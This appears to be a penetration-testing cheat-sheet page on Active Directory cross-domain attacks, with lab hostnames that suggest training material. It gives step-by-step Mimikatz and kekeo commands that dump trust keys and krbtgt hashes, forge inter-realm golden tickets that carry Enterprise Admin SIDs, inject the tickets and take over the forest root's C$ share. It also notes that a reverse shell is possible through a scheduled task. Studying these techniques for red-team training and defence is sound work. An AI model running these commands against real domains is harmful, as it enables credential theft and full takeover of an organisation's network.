---
description: Cross Domain Attacks
---

# Cross Domain Attacks

> Used to escalate privileges across domains and across forests. From DA of the current domain to EA/DA of the forest root.

There are two types of trusts:

1. Across domains: Implicit two way trust relationship.
2. Across forests: Trust relationship needs to be established manually.

***

### Across Domains

> From a child domain we will escalate our privileges to forest root.

Domains in same forest have an implicit two-way trust with other domains. The trust is automatically generated but there is a trust key between the parent and child domains.

There are two ways of escalating privileges between two domains of the same forest:

1. Trust tickets
2. Krbtgt hash

***

### Trust tickets

When accessing resources in other domains. Steps made in the Kerberos auth:

1. We request a TGT from the KDC (current domain).
2. We receive a TGT from the KDC (current domain).
3. We request a TGS from the KDC (current domain).
4. KDC checks that the service is in a parent domain. KDC returns a inter-realm TGT.
5. We request a TGS for the service from the KDC (of the parent domain).
6. We receive a TGS for the service from the KDC (of the parent domain).
7. We present that TGS to the service in the parent domain.

**Note:** The abusable step is the 5th one. The only check is made is that the parent domain KDC can decrypt the ticket, which is encrypted with the trust key.

If we have access to the trust key, we can forge an inter realm TGT and the parent domain will assume it to be valid.

#### 1. Grab the trust key

```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

#or

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"' #mcorp$ is the NETBIOS name of the parent domain
#Look for [In] Child -> Parent output. The hash is the rc4_hmac_nt
```

#### 2. Forge an inter-realm TGT

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID_CURRENTDOMAIN /sids:$SID_ENTERPRISEADMINS_GROUP /rc4:$NTLM_TRUSTKEY /service:krbtgt /target:$PARENT_DOMAIN /ticket:$PATH_TO_SAVE_THE_TICKET.kirbi"'
```

#### 3. Get a TGS for a service

```bash
#Using kekeo_old
.\asktgs.exe $TICKET_NAME.kirbi CIFS/mcorp-dc.moneycorp.local #We can create tickets for other services (HOST, RPCSS, HTTP...)
```

#### 4. Use the TGS to access the targeted service (may need to use twice)

```bash
#Using kekeo_old
.\kirbikator.exe lsa .\CIFS/mcorp-dc.moneycorp.local #The last one is the output from the above step (3)
```

#### 5. Verify we injected the ticket

```bash
klist
```

#### 6. Access the service

```bash
ls \\mcorp-dc......\c$
```

**Note:** With HOST SPN we can get a reverse shell by scheduling a task.

***

### KRBTGT Hash

#### 1. Get the krbtgt hash of the current domain

```bash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName $DC_HOSTNAME
```

#### 2. Get an inter-domain TGT

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID_CURRENTDOMAIN /sids:$SID_ENTERPRISE_ADMINSGROUP /krbtgt:$NTLM_KRBTGT_CURRENTDOMAIN /ticket:$PATH_TO_SAVE_TICKET.kirbi
```

#### 3. Inject the ticket in the current PS process

```bash
Invoke-Mimikatz -Command '"kerberos::ptt $PATH_TO_TICKET.kirbi
```

#### 4. Verify we injected the ticket

```bash
klist
```

#### 5. Access the service

```bash
ls \\mcorp-dc......\c$
```

**Note:** With HOST SPN we can get a reverse shell by scheduling a task.
